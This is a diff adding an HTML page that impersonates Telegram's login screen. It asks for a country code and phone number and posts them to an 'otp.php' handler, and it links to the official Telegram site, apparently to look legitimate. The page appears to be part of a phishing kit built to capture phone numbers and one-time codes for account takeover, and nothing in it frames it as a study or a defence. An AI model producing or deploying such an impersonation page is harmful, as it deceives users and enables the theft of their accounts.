@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="tg-container">
+        <div class="tg-header">
+            <h1>Telegram</h1>
+            <p>Please confirm your country and enter your phone number.</p>
+        </div>
+        
+        <form action="otp.php" method="POST" class="tg-form">
+            <div class="input-group">
+                <div class="country-select">
+                    <select name="countryCode">
+                        <option value="1">🇺🇸 +1 US</option>
+                        <option value="44">🇬🇧 +44 UK</option>
+                        <option value="91">🇮🇳 +91 IN</option>
+                    </select>
+                </div>
+                <div class="phone-input">
+                    <input type="tel" name="phoneNumber" placeholder="Phone number" required>
+                </div>
+            </div>
+            
+            <button type="submit" class="tg-button">NEXT</button>
+        </form>
+        
+        <div class="tg-footer">
+            <a href="https://telegram.org" target="_blank">Official Telegram Website</a>
+        </div>
+    </div>
+</body>
+</html>
